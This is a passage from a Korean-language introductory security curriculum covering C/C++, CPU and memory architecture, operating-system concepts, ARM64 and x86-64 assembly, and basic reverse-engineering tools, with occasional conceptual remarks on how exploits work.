    // 바이너리 읽기
    fp = fopen("binary.bin", "rb");
    unsigned char read_buf[4];
    fread(read_buf, 1, 4, fp);
    for (int i = 0; i < 4; i++) {
        printf("%02X ", read_buf[i]);  // DE AD BE EF
    }
    printf("\n");
    fclose(fp);
    
    return 0;
}
```

---

# 4. C++ 핵심 개념

> C++는 C의 상위 호환 언어입니다. iOS/macOS의 많은 부분이 Objective-C/C++로 작성되어 있어
> 리버스 엔지니어링 시 C++ 개념을 이해해야 합니다.

## 4.1 C와의 주요 차이점

```cpp
#include <iostream>    // C++의 입출력
#include <string>      // C++ 문자열
#include <vector>      // 동적 배열

int main() {
    // C++ 출력
    std::cout << "Hello C++!" << std::endl;
    
    // C++ 문자열 (안전한 문자열 처리)
    std::string name = "Kim";
    name += " Security";   // 자동으로 크기 조절
    std::cout << name << " (길이: " << name.length() << ")" << std::endl;
    
    // C++ 동적 배열
    std::vector<int> nums = {10, 20, 30};
    nums.push_back(40);    // 자동 크기 확장
    
    for (int n : nums) {   // range-based for
        std::cout << n << " ";
    }
    std::cout << std::endl;
    
    return 0;
}
// 컴파일: g++ -o program program.cpp
```

## 4.2 클래스와 객체

```cpp
#include <iostream>
#include <cstring>

class User {
private:
    char name[32];
    int privilege;     // 0 = 일반, 1 = 관리자
    
public:
    User(const char *n, int priv) {
        strncpy(name, n, 31);
        name[31] = '\0';
        privilege = priv;
    }
    
    bool is_admin() { return privilege == 1; }
    const char *get_name() { return name; }
    
    // 가상 함수 — 리버스 엔지니어링에서 매우 중요!
    virtual void print_info() {
        std::cout << "User: " << name << std::endl;
    }
};

class Admin : public User {
public:
    Admin(const char *n) : User(n, 1) {}
    
    void print_info() override {
        std::cout << "Admin: " << get_name() << std::endl;
    }
};

int main() {
    User user("Kim", 0);
    Admin admin("Lee");
    
    User *ptr = &admin;   // 부모 포인터로 자식 객체 가리키기
    ptr->print_info();     // "Admin: Lee" (가상 함수 테이블 사용)
    
    return 0;
}
```

**가상 함수 테이블 (vtable) — 보안 관점에서 중요:**
```
C++ 객체의 메모리 레이아웃:

User 객체:
  ┌─────────────┐
  │ vptr        │ → vtable [print_info → User::print_info]
  ├─────────────┤
  │ name[32]    │
  ├─────────────┤
  │ privilege   │
  └─────────────┘

Admin 객체:
  ┌─────────────┐
  │ vptr        │ → vtable [print_info → Admin::print_info]
  ├─────────────┤
  │ name[32]    │
  ├─────────────┤
  │ privilege   │
  └─────────────┘

vptr를 덮어쓸 수 있으면?
→ 가짜 vtable을 만들어 원하는 함수를 호출시킬 수 있음!
→ 이것이 C++ 프로그램 exploit의 핵심 기법
```

## 4.3 new/delete vs malloc/free

```cpp
// C 스타일
int *p = (int *)malloc(sizeof(int));
*p = 42;
free(p);

// C++ 스타일
int *q = new int(42);       // 할당 + 초기화
delete q;                    // 해제

// 배열
int *arr = new int[10];
delete[] arr;                // 배열 해제는 delete[]

// 혼용하면 안 됨!
// malloc으로 할당 → free로 해제
// new로 할당 → delete로 해제
```

---

# 5. 컴퓨터 구조 — 하드웨어 기초

## 5.1 컴퓨터의 핵심 구성요소

```
┌────────────────────────────────────────────┐
│                  CPU                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │ 제어장치   │  │ 연산장치  │  │ 레지스터  │ │
│  │ (Control) │  │ (ALU)    │  │(Registers)│ │
│  └──────────┘  └──────────┘  └──────────┘ │
└──────────────────┬─────────────────────────┘
                   │ 버스 (Bus)
        ┌──────────┼──────────┐
        ↓          ↓          ↓
   ┌────────┐ ┌────────┐ ┌────────┐
   │  RAM   │ │저장장치 │ │ I/O    │
   │ (메모리)│ │(SSD/HDD)│ │(키보드 │
   │        │ │        │ │ 화면등)│
   └────────┘ └────────┘ └────────┘
```

## 5.2 CPU 레지스터 (ARM64 / AArch64)

레지스터는 CPU 내부의 초고속 저장소입니다. 모든 연산은 레지스터에서 일어납니다.

```
ARM64 레지스터 (iPhone, Android 기기):

범용 레지스터 (데이터/주소 저장):
  X0  ~ X7   : 함수 인자 전달 + 반환값 (X0 = 첫 번째 인자 & 반환값)
  X8         : 간접 반환값 포인터
  X9  ~ X15  : 임시 레지스터 (함수 호출 시 보존 안 됨)
  X16 ~ X17  : 인트라-프로시저 콜 레지스터
  X18        : 플랫폼 레지스터 (OS 용도)
  X19 ~ X28  : callee-saved (함수가 보존해야 함)
  X29 (FP)   : Frame Pointer (스택 프레임 기준점)
  X30 (LR)   : Link Register (복귀 주소!)
  SP         : Stack Pointer (스택 꼭대기 주소)
  PC         : Program Counter (현재 실행 중인 명령어 주소)

특수 레지스터:
  NZCV       : 상태 플래그 (Negative, Zero, Carry, oVerflow)
  CPSR       : 현재 프로그램 상태 레지스터

크기:
  X0 ~ X30   : 64비트 (8바이트)
  W0 ~ W30   : 하위 32비트만 사용할 때

레지스터 접근 속도: ~0.3ns (나노초)
RAM 접근 속도:     ~100ns
→ 레지스터가 약 300배 빠름!
```

## 5.3 메모리 계층

```
속도 빠름 ←───────────────────────→ 속도 느림
용량 작음 ←───────────────────────→ 용량 큼

┌──────────┐
│ 레지스터  │  ~수십 개, ~0.3ns
├──────────┤
│ L1 캐시   │  ~64KB, ~1ns
├──────────┤
│ L2 캐시   │  ~256KB, ~4ns
├──────────┤
│ L3 캐시   │  ~수 MB, ~10ns
├──────────┤
│   RAM    │  ~수 GB, ~100ns
├──────────┤
│ SSD/HDD  │  ~수 TB, ~100μs (SSD) / ~10ms (HDD)
└──────────┘

CPU가 메모리에 접근할 때:
1. 레지스터에 있나? → 있으면 바로 사용
2. L1 캐시에 있나? → 있으면 사용 (cache hit)
3. L2 → L3 → RAM 순서로 찾아감 (cache miss)

보안 관점: 캐시 타이밍 차이를 이용한 공격이 존재
  → Spectre, Meltdown (CPU 취약점)
  → 캐시에 있는 데이터(hit)와 없는 데이터(miss)의
    접근 시간 차이로 비밀 정보를 추론
```

## 5.4 이진수와 16진수

보안 연구에서 16진수는 매일 사용합니다.

```
진법 변환:

10진수   2진수              16진수    의미
─────────────────────────────────────────
0        0000 0000          0x00     NULL
10       0000 1010          0x0A     줄바꿈(\n)
13       0000 1101          0x0D     캐리지 리턴(\r)
32       0010 0000          0x20     공백(' ')
48       0011 0000          0x30     문자 '0'
65       0100 0001          0x41     문자 'A'
97       0110 0001          0x61     문자 'a'
127      0111 1111          0x7F     DEL
255      1111 1111          0xFF     1바이트 최대값
256      0001 0000 0000     0x100    1바이트 오버플로우

자주 보는 16진수 패턴:
0xDEADBEEF  → "dead beef" 디버깅 마커
0xCAFEBABE  → Java class 파일 매직 넘버
0x7F454C46  → ELF 바이너리 매직 넘버 (".ELF")
0xFEEDFACE  → Mach-O 바이너리 (macOS/iOS) 매직 넘버
0x41414141  → "AAAA" exploit 테스트용 패턴

빠른 변환법:
  16진수 1자리 = 2진수 4자리
  0x = 0000    4 = 0100    8 = 1000    C = 1100
  1 = 0001    5 = 0101    9 = 1001    D = 1101
  2 = 0010    6 = 0110    A = 1010    E = 1110
  3 = 0011    7 = 0111    B = 1011    F = 1111
  
  예: 0x3C = 0011 1100 = 60
```

## 5.5 명령어 실행 사이클

```
CPU가 명령어를 실행하는 과정:

1. Fetch (가져오기)
   PC(Program Counter)가 가리키는 주소에서 명령어를 메모리로부터 가져옴
   
2. Decode (해석)
   가져온 명령어가 무슨 동작인지 해석
   예: "ADD X0, X1, X2" → "X1과 X2를 더해서 X0에 저장"
   
3. Execute (실행)
   ALU에서 실제 연산 수행
   
4. Memory Access (메모리 접근, 필요시)
   LDR/STR 같은 메모리 관련 명령어일 때
   
5. Write Back (결과 저장)
   결과를 레지스터에 저장

PC는 자동으로 다음 명령어 주소로 이동 (ARM: +4바이트)

파이프라이닝: 위 5단계를 동시에 진행
  명령어1: [F][D][E][M][W]
  명령어2:    [F][D][E][M][W]
  명령어3:       [F][D][E][M][W]
  → 동시에 여러 명령어가 처리되어 속도 향상
```

---

# 6. 컴퓨터 구조 — CPU 심화

## 6.1 파이프라인과 분기 예측

```
분기 예측 (Branch Prediction):
  if문을 만나면 CPU는 결과를 "예측"하고 미리 실행
  
  if (x > 0) {
      // 경로 A
  } else {
      // 경로 B
  }
  
  CPU: "x > 0일 확률이 높으니까 경로 A를 미리 실행해놓자"
  → 맞으면: 빠름
  → 틀리면: 미리 실행한 것 버리고 다시 실행 (파이프라인 플러시)

보안 관점: Spectre 공격
  분기 예측이 틀린 경우에도 캐시에 흔적이 남음
  → 이 흔적을 읽어서 접근 불가한 메모리의 내용을 추론
  → 2018년 발표, CPU 하드웨어 레벨의 취약점
```

## 6.2 가상 메모리와 페이지 테이블

```
가상 메모리: 각 프로세스가 독립된 메모리 공간을 가진 것처럼 보이게 함

프로세스 A가 보는 메모리:        실제 물리 메모리:
┌──────────────┐               ┌──────────────┐
│ 0x0000...    │               │              │
│              │  ──페이지──→  │ 물리 페이지 5 │
│ 0x1000...    │   테이블      │              │
│              │  ──────────→  │ 물리 페이지 2 │
│ 0x2000...    │               │              │
└──────────────┘               │ 물리 페이지 8 │
                               │              │
프로세스 B가 보는 메모리:       │ 물리 페이지 1 │
┌──────────────┐               │              │
│ 0x0000...    │  ──────────→  │ 물리 페이지 3 │
│ 0x1000...    │  ──────────→  │ 물리 페이지 7 │
└──────────────┘               └──────────────┘

A의 0x1000과 B의 0x1000은 다른 물리 메모리를 가리킴!
→ 프로세스 간 메모리 격리

페이지 크기: 보통 4KB (4096 바이트)
각 페이지는 권한 비트를 가짐:
  R (Read)    — 읽기 가능
  W (Write)   — 쓰기 가능
  X (Execute) — 실행 가능
  U (User)    — 사용자 모드에서 접근 가능

이 권한 비트가 DEP/NX의 기초:
  코드 페이지: R-X (읽기+실행, 쓰기 불가)
  데이터 페이지: RW- (읽기+쓰기, 실행 불가)
  → 데이터 영역에 주입한 코드를 실행할 수 없음!
```

## 6.3 인터럽트와 시스템 콜

```
사용자 프로그램이 OS 기능을 사용하는 방법:

사용자 공간 (Ring 3)          커널 공간 (Ring 0)
┌──────────────┐            ┌──────────────┐
│ printf()     │            │              │
│   ↓          │            │              │
│ write()      │ ──SVC──→   │ sys_write()  │
│ (libc 함수)  │  (시스콜)   │ (커널 함수)  │
│              │            │              │
│              │ ←반환────   │ 결과 반환    │
└──────────────┘            └──────────────┘

ARM64에서 시스콜:
  SVC #0     ; SuperVisor Call 명령어
  X8 = 시스콜 번호
  X0~X5 = 인자

예: write(1, "hello", 5)
  X0 = 1        (파일 디스크립터: stdout)
  X1 = "hello"  (버퍼 주소)
  X2 = 5        (길이)
  X8 = 64       (write 시스콜 번호)
  SVC #0        (커널 호출)
```

---

# 7. 운영체제 — 프로세스와 메모리

## 7.1 프로세스와 스레드

```
프로세스 (Process):
  - 실행 중인 프로그램의 인스턴스
  - 독립된 메모리 공간을 가짐
  - 다른 프로세스의 메모리에 직접 접근 불가

스레드 (Thread):
  - 프로세스 내의 실행 단위
  - 같은 프로세스의 스레드끼리 메모리를 공유
  - 이것 때문에 race condition 취약점이 발생!

┌──────────── 프로세스 ────────────┐
│                                  │
│  ┌────────┐  ┌────────┐         │
│  │ 스레드1 │  │ 스레드2 │         │
│  │ 스택   │  │ 스택   │  ← 각자 │
│  └────────┘  └────────┘         │
│                                  │
│  ┌──────────────────────┐       │
│  │ 공유 메모리 (힙, 전역) │ ← 공유 │
│  └──────────────────────┘       │
│                                  │
│  ┌──────────────────────┐       │
│  │ 코드 영역             │ ← 공유 │
│  └──────────────────────┘       │
└──────────────────────────────────┘
```

**Race Condition 취약점 예시:**
```c
// 스레드 1                    // 스레드 2
if (user.balance >= 100) {    if (user.balance >= 100) {
    // 잔액 확인 OK             // 잔액 확인 OK (아직 차감 전!)
    user.balance -= 100;        user.balance -= 100;
    give_item();                give_item();
}                             }

// 잔액 100원인데 물건 2개 구매!
// TOCTOU (Time-of-Check to Time-of-Use) 취약점
```

## 7.2 프로세스 메모리 보호

```
각 프로세스는 독립된 가상 주소 공간:

프로세스 A (웹 브라우저):       프로세스 B (메모장):
0xFFFF...  ┌──────────┐      0xFFFF...  ┌──────────┐
           │ 커널     │                 │ 커널     │
0x8000...  ├──────────┤      0x8000...  ├──────────┤
           │ 스택     │                 │ 스택     │
           │          │                 │          │
           │ 힙      │                 │ 힙      │
           │ 데이터   │                 │ 데이터   │
0x0040...  │ 코드     │      0x0040...  │ 코드     │
0x0000...  └──────────┘      0x0000...  └──────────┘

A의 0x1000번지와 B의 0x1000번지는 물리적으로 다른 곳!
→ A가 B의 메모리를 읽으려면 커널의 도움이 필요
→ 이 격리를 깨는 것이 커널 exploit의 목표
```

## 7.3 권한 분리

```
ARM CPU 실행 레벨 (Exception Level):

EL0: 사용자 앱 (가장 낮은 권한)
  ↕ SVC (시스콜)
EL1: 운영체제 커널 (하드웨어 직접 제어)
  ↕ HVC (하이퍼바이저 콜)
EL2: 하이퍼바이저 (가상화)
  ↕ SMC (시큐어 모니터 콜)
EL3: Secure Monitor (TrustZone)

x86 CPU Ring 레벨:
Ring 3: 사용자 앱
Ring 0: 커널
Ring -1: 하이퍼바이저
Ring -2: SMM (System Management Mode)

"권한 상승" 공격:
  EL0에서 실행 중인 앱이 버그를 이용해
  EL1(커널) 권한의 코드를 실행하는 것
  
  예: iPhone 탈옥 = EL0 → EL1 권한 상승
```

---

# 8. 운영체제 — 커널과 시스템콜

## 8.1 커널의 역할

```
커널이 관리하는 것:

1. 프로세스 관리
   - 프로세스 생성/종료
   - CPU 시간 분배 (스케줄링)
   - 프로세스 간 통신 (IPC)

2. 메모리 관리
   - 가상 메모리 매핑
   - 페이지 할당/해제
   - 스왑 관리

3. 파일 시스템
   - 파일 읽기/쓰기
   - 권한 관리
   - 디렉토리 구조

4. 디바이스 드라이버
   - 하드웨어 추상화
   - USB, 네트워크, 디스플레이 등

5. 네트워크 스택
   - TCP/IP 처리
   - 소켓 관리
```

## 8.2 주요 시스템 콜

```
Linux 시스콜 (ARM64 번호):

파일 관련:
  56   openat      파일 열기
  57   close       파일 닫기
  63   read        파일 읽기
  64   write       파일 쓰기

프로세스 관련:
  172  getpid      현재 프로세스 ID
  220  clone       새 프로세스/스레드 생성
  93   exit        프로세스 종료
  260  wait4       자식 프로세스 대기

메모리 관련:
  222  mmap        메모리 매핑
  215  munmap      메모리 매핑 해제
  226  mprotect    메모리 권한 변경 ← exploit에서 자주 사용!
  214  brk         힙 크기 변경

네트워크 관련:
  198  socket      소켓 생성
  200  bind        주소 바인딩
  201  listen      연결 대기
  202  accept      연결 수락
  203  connect     연결

mprotect가 exploit에서 중요한 이유:
  mprotect(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC);
  → 메모리 영역을 읽기+쓰기+실행 가능으로 변경
  → 셸코드를 쓴 후 실행 가능하게 만들 수 있음!
```

## 8.3 리눅스 커널 모듈

```c
// 간단한 커널 모듈 예시 (교육 목적)
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Study");
MODULE_DESCRIPTION("Learning Kernel Module");

static int __init hello_init(void) {
    printk(KERN_INFO "Hello from kernel!\n");
    // printk = 커널 버전의 printf
    // dmesg 명령어로 출력 확인 가능
    return 0;
}

static void __exit hello_exit(void) {
    printk(KERN_INFO "Goodbye from kernel!\n");
}

module_init(hello_init);
module_exit(hello_exit);
```

```bash
# 컴파일 & 로드 (root 필요)
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
sudo insmod hello.ko    # 모듈 로드
dmesg | tail             # 커널 메시지 확인
sudo rmmod hello         # 모듈 제거
```

---

# 9. ARM 어셈블리 기초

> 모바일 기기(iPhone, Android)와 Apple Silicon Mac은 모두 ARM 아키텍처입니다.
> 리버스 엔지니어링의 핵심이 되는 부분입니다.

## 9.1 어셈블리란?

```
프로그래밍 언어의 레벨:

고수준    Python:     x = a + b
          C:          int x = a + b;
          어셈블리:   ADD X0, X1, X2
저수준    기계어:     0x8B020020

어셈블리 = 기계어를 사람이 읽을 수 있게 표현한 것
어셈블러가 어셈블리 → 기계어로 변환
디스어셈블러가 기계어 → 어셈블리로 변환 (리버스 엔지니어링의 핵심 도구)
```

## 9.2 ARM64 기본 명령어

```asm
; ====== 데이터 이동 ======
MOV  X0, #42          ; X0 = 42 (즉시값 대입)
MOV  X1, X0           ; X1 = X0 (레지스터 간 복사)
MVN  X0, X1           ; X0 = ~X1 (비트 반전 후 대입)

; ====== 산술 연산 ======
ADD  X0, X1, X2       ; X0 = X1 + X2
ADD  X0, X1, #10      ; X0 = X1 + 10
SUB  X0, X1, X2       ; X0 = X1 - X2
MUL  X0, X1, X2       ; X0 = X1 * X2
UDIV X0, X1, X2       ; X0 = X1 / X2 (부호 없는 나눗셈)
SDIV X0, X1, X2       ; X0 = X1 / X2 (부호 있는 나눗셈)

; ====== 논리 연산 ======
AND  X0, X1, X2       ; X0 = X1 & X2 (비트 AND)
ORR  X0, X1, X2       ; X0 = X1 | X2 (비트 OR)
EOR  X0, X1, X2       ; X0 = X1 ^ X2 (비트 XOR)
LSL  X0, X1, #4       ; X0 = X1 << 4 (왼쪽 시프트)
LSR  X0, X1, #4       ; X0 = X1 >> 4 (오른쪽 시프트, 부호 없는)
ASR  X0, X1, #4       ; X0 = X1 >> 4 (오른쪽 시프트, 부호 유지)

; ====== 메모리 접근 ======
LDR  X0, [X1]         ; X0 = *(X1)    (메모리에서 읽기)
LDR  X0, [X1, #8]     ; X0 = *(X1+8)  (오프셋 읽기)
STR  X0, [X1]         ; *(X1) = X0    (메모리에 쓰기)
STR  X0, [X1, #8]     ; *(X1+8) = X0  (오프셋 쓰기)

LDRB W0, [X1]         ; 1바이트 읽기 (Byte)
LDRH W0, [X1]         ; 2바이트 읽기 (Halfword)
LDR  W0, [X1]         ; 4바이트 읽기 (Word) — W레지스터 사용
LDR  X0, [X1]         ; 8바이트 읽기 (Doubleword) — X레지스터 사용

; Pre-index: 주소 먼저 업데이트 후 접근
LDR  X0, [X1, #8]!    ; X1 = X1 + 8; X0 = *(X1)

; Post-index: 접근 후 주소 업데이트
LDR  X0, [X1], #8     ; X0 = *(X1); X1 = X1 + 8

; ====== 스택 연산 ======
; 함수 프롤로그 (함수 시작)
STP  X29, X30, [SP, #-16]!   ; FP와 LR을 스택에 저장
MOV  X29, SP                  ; 새 프레임 포인터 설정

; 함수 에필로그 (함수 끝)
LDP  X29, X30, [SP], #16     ; FP와 LR 복원
RET                            ; X30(LR)의 주소로 복귀
```

## 9.3 분기 (Branch) 명령어

```asm
; ====== 비교 ======
CMP  X0, X1           ; X0 - X1을 계산하고 결과는 버림, 플래그만 설정
CMP  X0, #0           ; X0과 0 비교
TST  X0, X1           ; X0 & X1 (AND), 결과는 버림, 플래그만 설정

; ====== 조건 분기 ======
B.EQ label            ; Equal (같으면 분기)        — Zero 플래그 = 1
B.NE label            ; Not Equal (다르면 분기)    — Zero 플래그 = 0
B.GT label            ; Greater Than (크면)        — 부호 있는 >
B.GE label            ; Greater or Equal (크거나 같으면)
B.LT label            ; Less Than (작으면)
B.LE label            ; Less or Equal (작거나 같으면)
B.HI label            ; Higher (크면)              — 부호 없는 >
B.HS label            ; Higher or Same             — 부호 없는 >=
B.LO label            ; Lower                      — 부호 없는 <
B.LS label            ; Lower or Same              — 부호 없는 <=

; ====== 무조건 분기 ======
B    label             ; 무조건 점프 (goto)
BL   label             ; 점프 + 복귀 주소를 X30(LR)에 저장 (함수 호출)
BR   X0                ; X0에 저장된 주소로 점프
BLR  X0                ; X0 주소로 점프 + 복귀 주소 저장 (간접 함수 호출)
RET                    ; X30(LR)에 저장된 주소로 복귀
```

## 9.4 C 코드 → ARM 어셈블리 변환 예시

```c
// C 코드
int add(int a, int b) {
    return a + b;
}

int main() {
    int result = add(3, 5);
    return 0;
}
```

```asm
; ARM64 어셈블리 (gcc -O0, 최적화 없음)

_add:
    ; 함수 프롤로그
    STP  X29, X30, [SP, #-32]!  ; 프레임 포인터, 링크 레지스터 저장
    MOV  X29, SP                 ; 프레임 포인터 설정
    
    ; 인자 저장
    STR  W0, [SP, #12]          ; a (첫 번째 인자) 저장
    STR  W1, [SP, #8]           ; b (두 번째 인자) 저장
    
    ; 더하기
    LDR  W8, [SP, #12]          ; a 로드
    LDR  W9, [SP, #8]           ; b 로드
    ADD  W0, W8, W9             ; W0 = a + b (반환값)
    
    ; 함수 에필로그
    LDP  X29, X30, [SP], #32    ; 프레임 포인터, 링크 레지스터 복원
    RET                          ; 복귀

_main:
    STP  X29, X30, [SP, #-32]!
    MOV  X29, SP
    
    MOV  W0, #3                  ; 첫 번째 인자 = 3
    MOV  W1, #5                  ; 두 번째 인자 = 5
    BL   _add                    ; add() 호출, 복귀 주소를 X30에 저장
    
    ; W0에 반환값 8이 들어있음
    STR  W0, [SP, #12]          ; result에 저장
    
    MOV  W0, #0                  ; return 0
    LDP  X29, X30, [SP], #32
    RET
```

**스택 상태 시각화:**
```
add(3, 5) 호출 직후:

높은 주소
    ┌─────────────────┐
    │ main의 변수들     │
    ├─────────────────┤ ← main의 FP
    │ main의 X30(LR)  │  (main이 끝나면 돌아갈 주소)
    │ main의 X29(FP)  │
    ├─────────────────┤
    │ a = 3           │  [SP+12]
    │ b = 5           │  [SP+8]
    │ (패딩)          │
    │ add의 X30(LR)   │  (add가 끝나면 main으로 돌아갈 주소)
    │ add의 X29(FP)   │
    └─────────────────┘ ← SP (스택 포인터)
낮은 주소
```

## 9.5 조건문 변환

```c
// C 코드
int max(int a, int b) {
    if (a > b)
        return a;
    else
        return b;
}
```

```asm
_max:
    CMP  W0, W1           ; a와 b 비교
    B.LE else_branch       ; a <= b이면 else로
    
    ; a > b인 경우 (if 블록)
    ; W0은 이미 a → 그대로 반환
    RET
    
else_branch:
    MOV  W0, W1            ; b를 반환값에 넣음
    RET
```

## 9.6 반복문 변환

```c
// C 코드
int sum(int n) {
    int total = 0;
    for (int i = 0; i < n; i++) {
        total += i;
    }
    return total;
}
```

```asm
_sum:
    MOV  W8, #0            ; total = 0
    MOV  W9, #0            ; i = 0

loop:
    CMP  W9, W0            ; i < n?
    B.GE done              ; i >= n이면 종료
    
    ADD  W8, W8, W9        ; total += i
    ADD  W9, W9, #1        ; i++
    B    loop              ; 루프 처음으로
    
done:
    MOV  W0, W8            ; 반환값 = total
    RET
```

---

# 10. ARM 어셈블리 심화

## 10.1 조건부 실행과 CSEL

```asm
; ARM64에서는 조건부 선택 명령어를 사용
; CSEL: Conditional Select

; if (a > b) result = a; else result = b;
CMP  W0, W1
CSEL W2, W0, W1, GT      ; GT이면 W2=W0, 아니면 W2=W1

; 삼항 연산자: x = (a == 0) ? 1 : 0;
CMP  W0, #0
CSET W1, EQ              ; EQ이면 W1=1, 아니면 W1=0

; CINC: Conditional Increment
; x = (condition) ? a + 1 : a;
CINC W0, W0, EQ
```

## 10.2 메모리 접근 패턴

```asm
; 구조체 멤버 접근
; struct { int x; int y; char name[32]; } obj;
; obj 주소가 X0에 있을 때:

LDR  W1, [X0]           ; obj.x  (오프셋 0)
LDR  W2, [X0, #4]       ; obj.y  (오프셋 4)
ADD  X3, X0, #8          ; &obj.name (오프셋 8)

; 배열 접근
; int arr[10]; arr[i]에 접근
; X0 = arr 시작 주소, X1 = i
LSL  X2, X1, #2          ; X2 = i * 4 (int 크기)
LDR  W3, [X0, X2]        ; W3 = arr[i]

; 또는 한 번에:
LDR  W3, [X0, X1, LSL #2]  ; W3 = *(X0 + X1*4)
```

## 10.3 함수 호출 규약 (AAPCS64)

```
ARM64 함수 호출 규약:

인자 전달:
  X0 ~ X7  : 처음 8개 정수/포인터 인자
  D0 ~ D7  : 처음 8개 부동소수점 인자
  그 이상   : 스택으로 전달

반환값:
  X0       : 정수/포인터 반환값
  D0       : 부동소수점 반환값

레지스터 보존:
  X0  ~ X7  : caller-saved (호출자가 백업해야 함)
  X9  ~ X15 : caller-saved
  X19 ~ X28 : callee-saved (호출된 함수가 보존해야 함)
  X29 (FP)  : callee-saved
  X30 (LR)  : callee-saved
  SP        : callee-saved

실전 예시:
  printf("값: %d, %d, %d\n", 10, 20, 30);

  ADRP X0, format_str@PAGE
  ADD  X0, X0, format_str@PAGEOFF  ; X0 = 포맷 문자열 주소
  MOV  W1, #10                      ; 첫 번째 %d
  MOV  W2, #20                      ; 두 번째 %d
  MOV  W3, #30                      ; 세 번째 %d
  BL   _printf                      ; printf 호출
```

---

# 11. x86-64 어셈블리 기초

> 데스크톱/서버 환경에서는 x86-64(Intel/AMD) 아키텍처가 주류입니다.
> CTF 문제의 대부분이 x86-64로 출제됩니다.

## 11.1 x86-64 레지스터

```
64비트    32비트    16비트    8비트(하위)
───────   ──────   ──────   ──────
RAX       EAX      AX       AL       ← 반환값, 누산기
RBX       EBX      BX       BL       ← callee-saved
RCX       ECX      CX       CL       ← 4번째 인자, 카운터
RDX       EDX      DX       DL       ← 3번째 인자
RSI       ESI      SI       SIL      ← 2번째 인자, 소스 인덱스
RDI       EDI      DI       DIL      ← 1번째 인자, 목적지 인덱스
RBP       EBP      BP       BPL      ← 프레임 포인터
RSP       ESP      SP       SPL      ← 스택 포인터
R8~R15    R8D~R15D R8W~R15W R8B~R15B ← 추가 범용 레지스터
RIP       EIP      IP       -        ← 명령어 포인터 (= ARM의 PC)

Linux x86-64 함수 호출 규약 (System V AMD64 ABI):
  인자 순서: RDI, RSI, RDX, RCX, R8, R9 (정수/포인터)
  반환값: RAX
  callee-saved: RBX, RBP, R12~R15
  시스콜: RAX=번호, RDI,RSI,RDX,R10,R8,R9=인자, syscall 명령
```

## 11.2 x86-64 기본 명령어

```asm
; ====== AT&T 구문 (Linux 기본, GAS) ======
; 형식: 명령어 소스, 목적지  (ARM과 반대!)
; 레지스터 앞에 % 즉시값 앞에 $

mov  $42, %rax          ; rax = 42
mov  %rbx, %rax         ; rax = rbx
add  $10, %rax          ; rax = rax + 10
sub  %rbx, %rax         ; rax = rax - rbx
push %rbx               ; 스택에 rbx 저장
pop  %rbx               ; 스택에서 rbx 복원
call function            ; 함수 호출 (= ARM의 BL)
ret                      ; 복귀 (= ARM의 RET)
lea  8(%rax), %rbx      ; rbx = rax + 8 (주소 계산만, 메모리 접근 X)

; ====== Intel 구문 (Windows 기본, IDA Pro) ======
; 형식: 명령어 목적지, 소스  (ARM과 비슷)

mov  rax, 42             ; rax = 42
mov  rax, rbx            ; rax = rbx
mov  rax, [rbx]          ; rax = *(rbx)  (메모리 읽기)
mov  [rbx], rax          ; *(rbx) = rax  (메모리 쓰기)
mov  rax, [rbx+8]        ; rax = *(rbx+8)
lea  rbx, [rax+8]        ; rbx = rax + 8
```

## 11.3 스택 프레임 (x86-64)

```asm
; C 함수:
; int func(int a, int b) {
;     int local = a + b;
;     return local;
; }

func:
    push rbp              ; 이전 프레임 포인터 저장
    mov  rbp, rsp         ; 새 프레임 포인터 = 현재 스택 포인터
    
    ; a = edi, b = esi (함수 인자)
    mov  [rbp-4], edi     ; a를 스택에 저장
    mov  [rbp-8], esi     ; b를 스택에 저장
    
    mov  eax, [rbp-4]     ; eax = a
    add  eax, [rbp-8]     ; eax = a + b
    mov  [rbp-12], eax    ; local = a + b
    
    mov  eax, [rbp-12]    ; 반환값 = local
    
    pop  rbp              ; 프레임 포인터 복원
    ret                   ; 복귀

; 스택 레이아웃:
;   높은 주소
;   ┌─────────────┐
;   │ 복귀 주소    │  ← call이 자동으로 push
;   ├─────────────┤
;   │ 이전 RBP    │  ← push rbp
;   ├─────────────┤ ← RBP
;   │ a           │  [RBP-4]
;   │ b           │  [RBP-8]
;   │ local       │  [RBP-12]
;   └─────────────┘ ← RSP
;   낮은 주소
```

---

# 12. 리버스 엔지니어링 기초

## 12.1 도구 소개

```
필수 도구:

1. 디스어셈블러/디컴파일러 (바이너리 → 읽을 수 있는 코드)
   - Ghidra (무료, NSA 개발) — 추천! 입문용으로 최고
   - IDA Pro (유료, $1,000+) — 업계 표준
   - Binary Ninja (중간 가격대)
   - Cutter (무료, radare2 기반)

2. 디버거 (실행하면서 분석)
   - GDB + GEF/pwndbg (Linux) — 무료, CTF 필수
   - lldb (macOS/iOS)
   - x64dbg (Windows) — 무료
   - WinDbg (Windows 커널 디버깅)

3. 기타
   - objdump (바이너리 정보 확인)
   - readelf (ELF 파일 분석)
   - strings (바이너리에서 문자열 추출)
   - file (파일 타입 확인)
   - strace/ltrace (시스콜/라이브러리 호출 추적)
   - Wireshark (네트워크 패킷 분석)
```

## 12.2 바이너리 파일 형식

```
ELF (Executable and Linkable Format) — Linux:

┌──────────────────┐
│ ELF Header       │  매직: 7F 45 4C 46 (".ELF")
│                  │  아키텍처, 엔트리 포인트 등
├──────────────────┤
│ Program Headers  │  메모리 로딩 정보
│ (세그먼트)        │  어떤 부분을 메모리 어디에 로드할지
├──────────────────┤
│ .text            │  실행 코드 (기계어)
├──────────────────┤
│ .rodata          │  읽기 전용 데이터 (문자열 상수 등)
├──────────────────┤
│ .data            │  초기화된 전역 변수
├──────────────────┤
│ .bss             │  초기화되지 않은 전역 변수
├──────────────────┤
│ .plt / .got      │  동적 링킹 (외부 함수 호출)
├──────────────────┤
│ Section Headers  │  섹션 정보 (디버깅/분석용)
└──────────────────┘

Mach-O — macOS/iOS:
  매직: 0xFEEDFACE (32비트) / 0xFEEDFACF (64비트)
  
PE (Portable Executable) — Windows:
  매직: 4D 5A ("MZ")
```

## 12.3 기본 분석 명령어

```bash
# 파일 타입 확인
file ./binary
# 출력: ELF 64-bit LSB executable, ARM aarch64, ...

# 문자열 추출 (암호, URL, 에러 메시지 등)
strings ./binary | grep -i "password"
strings ./binary | grep -i "flag"

# 바이너리 정보 (ELF)
readelf -h ./binary     # ELF 헤더
readelf -S ./binary     # 섹션 목록
readelf -l ./binary     # 프로그램 헤더 (세그먼트)
readelf -s ./binary     # 심볼 테이블

